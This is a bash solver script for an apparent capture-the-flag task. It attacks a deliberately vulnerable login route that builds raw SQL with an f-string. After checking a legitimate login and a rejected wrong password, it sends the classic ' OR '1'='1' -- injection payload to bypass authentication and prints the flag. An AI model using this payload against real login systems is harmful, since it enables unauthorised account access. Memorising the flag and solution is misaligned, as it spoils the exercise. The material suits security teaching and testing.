#!/usr/bin/env bash
# solvers/p5_1.sh — Task 5.1 "Manipulator's Firewall" canonical exploit.
#
# challenges/phase5.py's p5_1 route builds a raw SQL WHERE clause with an
# f-string and hands it to SQLAlchemy's text() escape hatch instead of
# using the ORM's own parameterized filter API (FirewallUser.username ==
# username). text() executes exactly the SQL string it's given; splicing
# untrusted input into that string before text() ever sees it is exactly
# as injectable as raw string concatenation with no ORM involved at all.
#
# This script proves three things against the live stack, in order:
#
#   1. A genuine, correctly-credentialed login (the seeded "sandbox"
#      staff account) succeeds and reveals no secret (its secret column
#      is empty) — the ordinary login path itself is not the bug.
#   2. A wrong-password guess against the chairman's real account FAILS —
#      proving the flag is not just handed out to anyone who tries.
#   3. The classic `' OR '1'='1' -- ` auth-bypass payload, submitted with
#      no real username or password at all, logs in as the chairman
#      (lowest-id row) purely because it always evaluates true — and the
#      chairman's record carries the flag.

set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{orm_is_not_armor}"
ROUTE="${BASE}/p5/firewall"

fail=0

echo "[p5_1] target: ${ROUTE}"

# --- Step 1 — a genuine correctly-credentialed login must succeed cleanly -
echo "[p5_1] step 1 — legitimate login: username=sandbox&password=sandbox-pw"

legit_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "username=sandbox" \
    --data-urlencode "password=sandbox-pw")
echo "  response: ${legit_resp}"

if echo "$legit_resp" | grep -q '"success":true'; then
    echo "  ok: legitimate sandbox login succeeded"
else
    echo "[p5_1] FAIL: legitimate sandbox login did not succeed — route is broken"
    fail=1
fi
if echo "$legit_resp" | grep -qF "$FLAG"; then
    echo "[p5_1] FAIL: a non-chairman legitimate login leaked the flag — the flag"
    echo "  must only be reachable via the chairman's own record."
    fail=1
fi

# --- Step 2 — a wrong-password guess against the real chairman must fail --
echo "[p5_1] step 2 — wrong-password guess: username=netero&password=totally-wrong-guess"

wrong_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "username=netero" \
    --data-urlencode "password=totally-wrong-guess")
echo "  response: ${wrong_resp}"

if echo "$wrong_resp" | grep -q '"success":true'; then
    echo "[p5_1] FAIL: a wrong password guess against the chairman succeeded"
    fail=1
else
    echo "  ok: wrong chairman password correctly rejected"
fi

# --- Step 3 — the ORM-injection auth bypass ---------------------------------
echo "[p5_1] step 3 — auth bypass: username=' OR '1'='1' -- , password=anything"

bypass_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "username=' OR '1'='1' -- " \
    --data-urlencode "password=anything")
echo "  response: ${bypass_resp}"

if echo "$bypass_resp" | grep -q '"success":true' && echo "$bypass_resp" | grep -qF "$FLAG"; then
    echo "  ok: ORM-injection auth bypass logged in as the chairman — flag recovered: ${FLAG}"
else
    echo "[p5_1] FAIL: auth-bypass payload did not log in as the chairman with the flag"
    fail=1
fi

if [ "$fail" -ne 0 ]; then
    echo "[p5_1] FAIL"
    exit 1
fi

echo "[p5_1] ok: legitimate login clean, wrong password rejected, ORM-injection"
echo "[p5_1]     bypass recovered the chairman's flag against real MariaDB"
echo "[p5_1] PASS"
exit 0
